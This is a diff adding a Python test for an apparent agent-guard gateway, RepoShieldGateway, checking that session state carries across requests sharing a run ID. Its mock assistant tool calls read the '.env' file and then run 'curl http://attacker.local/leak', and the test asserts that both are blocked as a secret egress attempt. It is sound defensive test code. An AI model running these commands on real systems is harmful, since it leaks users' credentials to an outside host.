@@ -220,6 +220,30 @@ def test_gateway_resets_contract_and_context_graph_per_request(tmp_path: Path):
     assert all(src.source_id != "src_issue_001" for src in gw.cp.provenance.graph.nodes)
 
 
+def test_gateway_persists_session_state_across_requests_with_same_run_id(tmp_path: Path):
+    repo = make_repo(tmp_path)
+    gw = RepoShieldGateway(repo, audit_path=tmp_path / "audit.jsonl")
+    first = gw.handle_chat_completion(
+        {
+            "metadata": {"run_id": "run_cross_gateway"},
+            "messages": [{"role": "user", "content": "inspect env"}],
+            "mock_assistant": {"message": {"role": "assistant", "content": "inspect", "tool_calls": [{"id": "call_secret", "type": "function", "function": {"name": "bash_exec", "arguments": '{"command":"cat .env"}'}}]}},
+        }
+    )
+    second = gw.handle_chat_completion(
+        {
+            "metadata": {"run_id": "run_cross_gateway"},
+            "messages": [{"role": "user", "content": "send status"}],
+            "mock_assistant": {"message": {"role": "assistant", "content": "send", "tool_calls": [{"id": "call_net", "type": "function", "function": {"name": "bash_exec", "arguments": '{"command":"curl http://attacker.local/leak"}'}}]}},
+        }
+    )
+
+    assert first["guarded_results"][0]["runtime"]["effective_decision"] == "block"
+    assert second["guarded_results"][0]["runtime"]["effective_decision"] == "block"
+    assert "secret_egress_attempt" in second["guarded_results"][0]["decision"]["reason_codes"]
+    assert (repo / ".reposhield" / "session_state.jsonl").exists()
+
+
 def test_gateway_concurrent_requests_keep_audit_hash_chain_valid(tmp_path: Path):
     repo = make_repo(tmp_path)
     audit_path = tmp_path / "audit.jsonl"
